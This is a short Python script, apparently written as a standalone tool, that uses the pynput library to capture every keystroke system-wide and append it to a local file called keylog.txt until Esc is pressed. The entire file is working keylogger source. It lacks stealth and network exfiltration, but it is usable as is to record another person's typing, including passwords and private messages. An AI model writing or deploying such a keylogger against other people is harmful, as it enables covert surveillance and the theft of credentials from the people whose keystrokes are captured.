from pynput import keyboard

# Path to the log file
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f'{key.char}')
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file, "a") as file:
                file.write(' ')
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as file:
                file.write('\n')
        else:
            with open(log_file, "a") as file:
                file.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
